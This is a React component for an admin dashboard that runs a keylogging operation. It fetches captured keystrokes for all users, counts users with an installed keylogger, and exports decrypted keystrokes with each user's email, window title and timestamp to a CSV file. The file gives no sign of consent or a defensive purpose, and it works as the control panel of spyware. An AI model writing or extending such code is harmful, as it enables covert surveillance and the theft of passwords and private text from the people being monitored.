import React, { useContext, useEffect, useState } from "react";
import { useNavigate } from "react-router-dom";
import { AppContent } from "../context/AppContext";
import axios from "axios";
import { saveAs } from "file-saver";
import KeystrokeMonitor from "../components/KeyStrokeMonitor";

const AdminDashboard = () => {
  const { userData, backendUrl } = useContext(AppContent);
  const [users, setUsers] = useState([]);
  const [keystrokes, setKeystrokes] = useState([]);
  const [loading, setLoading] = useState(true);
  const navigate = useNavigate();

  useEffect(() => {
    const fetchData = async () => {
      if (userData?.role !== "admin") {
        navigate("/");
        return;
      }

      try {
        const [usersRes, keystrokesRes] = await Promise.all([
          axios.get(`${backendUrl}/api/admin/users`, { withCredentials: true }),
          axios.get(`${backendUrl}/api/admin/keystrokes`, {
            withCredentials: true,
          }),
        ]);

        if (usersRes.data.success) setUsers(usersRes.data.users);
        if (keystrokesRes.data.success)
          setKeystrokes(keystrokesRes.data.keystrokes);
      } catch (error) {
        console.error("Admin data fetch error:", error);
      } finally {
        setLoading(false);
      }
    };

    fetchData();
  }, [userData, navigate, backendUrl]);

  //  DOWNLOAD decrypted logs as CSV
  const downloadDecryptedLogs = async () => {
    try {
      const { data } = await axios.get(
        `${backendUrl}/api/keylogger/decrypted`,
        { withCredentials: true }
      );

      if (!data.success) {
        return alert("Failed to fetch decrypted logs");
      }

      const logs = data.logs;

      const csvRows = [
        ["User Email", "Window Title", "Keystrokes", "Timestamp"], // headers
        ...logs.map((log) => [
          log.userId?.email || "N/A",
          log.windowTitle,
          log.keystrokes.replace(/\n/g, "\\n"), // escape newlines for CSV
          new Date(log.createdAt).toLocaleString(),
        ]),
      ];

      const csvString = csvRows
        .map((row) => row.map((field) => `"${field}"`).join(","))
        .join("\n");

      const blob = new Blob([csvString], { type: "text/csv;charset=utf-8;" });
      saveAs(blob, "decrypted_keystrokes.csv");
    } catch (error) {
      console.error("Download failed:", error);
      alert("Error downloading decrypted logs");
    }
  };

  if (userData?.role !== "admin") {
    return null;
  }

  if (loading) {
    return <div className="text-center py-20">Loading admin dashboard...</div>;
  }

  return (
    <div className="min-h-screen bg-[#0b0f1e] text-white p-6">
      <div className="max-w-7xl mx-auto">
        <h1 className="text-3xl font-bold text-cyan-400 mb-8">
          Admin Dashboard
        </h1>

        <div className="grid grid-cols-1 md:grid-cols-3 gap-6 mb-8">
          <div className="bg-[#1a1f2e] p-6 rounded-lg border border-cyan-800">
            <h3 className="text-lg font-semibold mb-2">Total Users</h3>
            <p className="text-3xl font-bold">{users.length}</p>
          </div>
          <div className="bg-[#1a1f2e] p-6 rounded-lg border border-cyan-800">
            <h3 className="text-lg font-semibold mb-2">Active Keyloggers</h3>
            <p className="text-3xl font-bold">
              {users.filter((u) => u.keyloggerInstalled).length}
            </p>
          </div>
        </div>

        {/*  Decrypted download button */}
        <div className="mb-6">
          <button
            onClick={downloadDecryptedLogs}
            className="px-4 py-2 bg-green-600 hover:bg-green-700 text-white rounded"
          >
            Download Decrypted Keystrokes
          </button>
        </div>

        {/* Render Keystroke Monitor with encrypted data */}
        <KeystrokeMonitor keystrokes={keystrokes} />
      </div>
    </div>
  );
};

export default AdminDashboard;
